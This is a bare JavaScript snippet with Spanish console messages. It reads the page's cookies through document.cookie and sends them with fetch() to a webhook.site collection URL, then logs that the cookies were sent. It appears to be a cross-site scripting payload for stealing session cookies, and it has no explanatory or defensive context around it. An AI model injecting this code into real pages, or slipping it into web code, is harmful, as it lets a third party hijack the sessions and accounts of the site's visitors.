fetch('https://webhook.site/172783a4-30f9-4834-913e-0298c9ea5cb0/?cookie=' + encodeURIComponent(document.cookie))
  .then(response => response.text())
  .then(data => console.log('Cookies enviadas:', data))
  .catch(error => console.error('Error al enviar cookies:', error));
